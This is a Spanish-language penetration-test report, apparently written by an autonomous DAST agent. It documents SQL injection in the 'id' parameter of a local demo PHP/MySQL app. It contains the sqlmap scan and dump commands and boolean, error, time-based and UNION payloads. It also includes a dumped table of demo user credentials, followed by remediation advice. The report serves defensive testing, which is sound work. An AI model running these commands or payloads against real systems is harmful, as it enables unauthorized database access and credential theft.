# Informe de Auditoría de Seguridad — SQL Injection
**Fecha:** 2026-04-21T07:05:18  
**Objetivo:** http://web.dev.local:8083  
**Herramientas:** curl, sqlmap 1.10.2  
**Analista:** Agente Autónomo DAST (Claude Sonnet 4.6)

---

## 1. Resumen Ejecutivo

Se realizó un análisis de seguridad dinámica (DAST) sobre la aplicación web alojada en `http://web.dev.local:8083`. Durante la fase de reconocimiento se identificó un formulario de búsqueda de usuarios con un parámetro GET (`id`) sin sanitizar. La herramienta sqlmap confirmó que dicho parámetro es **vulnerable a SQL Injection** mediante múltiples técnicas (boolean-based blind, error-based, time-based blind y UNION query). La explotación fue exitosa: se extrajeron las credenciales completas de 8 usuarios de la base de datos `sqli_demo`.

**Severidad:** 🔴 CRÍTICA  
**Estado:** Vulnerabilidad confirmada y explotada con éxito.

---

## 2. Fase 1 — Reconocimiento

### Tecnología detectada
- **Sistema Operativo:** Linux Debian
- **Servidor Web:** Apache 2.4.65
- **Lenguaje:** PHP 8.1.33
- **Base de datos:** MySQL >= 5.1 (MariaDB fork)

### Vectores identificados

Mediante `curl http://web.dev.local:8083/` se identificó el siguiente formulario HTML:

```html
<form action="#" method="GET">
  <label for="id">User ID:</label>
  <input type="text" name="id" id="id">
  <input type="submit" name="Submit" value="Submit">
</form>
```

**Vector de entrada:** Parámetro `id` en petición HTTP GET  
**URL de ejemplo:** `http://web.dev.local:8083/?id=1&Submit=Submit`

La aplicación responde con datos de usuario cuando el ID es válido:
```
ID: 1
First name: John
Surname: Doe
```

---

## 3. Fase 2 — Escaneo de Vulnerabilidades

### Comando ejecutado

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --level=3 --risk=2
```

### Resultado de sqlmap

sqlmap confirmó **4 técnicas de inyección** sobre el parámetro `id`:

| Tipo | Título | Payload |
|------|--------|---------|
| Boolean-based blind | OR boolean-based blind - WHERE/HAVING clause (NOT) | `id=1' OR NOT 8214=8214-- AqsF` |
| Error-based | MySQL >= 5.1 AND error-based - EXTRACTVALUE | `id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,...))-- vHQx` |
| Time-based blind | MySQL >= 5.0.12 AND time-based blind (SLEEP) | `id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt` |
| UNION query | Generic UNION query (NULL) - 2 columns | `id=1' UNION ALL SELECT CONCAT(...),NULL-- -` |

**Conclusión:** El parámetro `id` es **inyectable** con alta certeza.

---

## 4. Fase 3 — Explotación Activa

### Comando de explotación

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch \
  --current-user --current-db --dbs -D sqli_demo -T users --dump
```

### Información del servidor extraída

| Campo | Valor |
|-------|-------|
| Usuario actual de BD | `root@%` |
| Base de datos actual | `sqli_demo` |
| Bases de datos disponibles | `information_schema`, `mysql`, `performance_schema`, `sqli_demo`, `sys` |

### Tabla `sqli_demo.users` — Volcado completo

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

**Nota de seguridad:** Las contraseñas están almacenadas en **texto plano**, lo que agrava notablemente el impacto de la vulnerabilidad.

---

## 5. Hallazgos

### VULN-001: SQL Injection en parámetro `id` (GET)

| Campo | Detalle |
|-------|---------|
| **URL** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **Parámetro** | `id` (GET) |
| **DBMS** | MySQL >= 5.1 (MariaDB) |
| **Técnicas** | Boolean-based blind, Error-based, Time-based blind, UNION query |
| **Impacto** | Lectura completa de la base de datos, incluyendo credenciales de usuario |
| **CVSS (estimado)** | 9.8 — Crítico |
| **CWE** | CWE-89: Improper Neutralization of Special Elements used in an SQL Command |

### VULN-002: Almacenamiento de contraseñas en texto plano

| Campo | Detalle |
|-------|---------|
| **Tabla** | `sqli_demo.users` |
| **Impacto** | Contraseñas expuestas directamente sin hash ni cifrado |
| **CVSS (estimado)** | 7.5 — Alto |
| **CWE** | CWE-312: Cleartext Storage of Sensitive Information |

---

## 6. Evidencia de Explotación

- **Usuario de base de datos comprometido:** `root@%` (máximos privilegios)
- **Registros extraídos:** 8 usuarios con emails y contraseñas en claro
- **Credencial de administrador obtenida:** `admin / password123`
- **Archivo CSV generado por sqlmap:** `/root/.local/share/sqlmap/output/web.dev.local/dump/sqli_demo/users.csv`

---

## 7. Recomendaciones

1. **Usar sentencias preparadas (Prepared Statements)** en todas las consultas SQL, evitando la concatenación directa de parámetros de usuario.
2. **Implementar validación y sanitización de entradas** — filtrar caracteres especiales SQL en el lado del servidor.
3. **Aplicar el principio de mínimo privilegio** — el usuario de BD no debe ser `root`. Usar un usuario con permisos mínimos (solo SELECT sobre las tablas necesarias).
4. **Hashear las contraseñas** usando algoritmos seguros como `bcrypt` o `Argon2`.
5. **Configurar un WAF** (Web Application Firewall) para detectar y bloquear patrones de inyección SQL.
6. **Habilitar logging de consultas SQL** para detectar intentos de explotación.

---

## 8. Conclusión

La aplicación web en `http://web.dev.local:8083` presenta una vulnerabilidad crítica de **SQL Injection** en el parámetro `id` del formulario de búsqueda de usuarios. La explotación fue completamente exitosa, permitiendo enumerar toda la estructura de la base de datos y extraer las credenciales en texto plano de todos los usuarios registrados, incluyendo la cuenta de administrador. Se requiere corrección inmediata antes de exponer esta aplicación en cualquier entorno productivo.

---
*Informe generado automáticamente por Agente DAST — 2026-04-21T07:05:18*
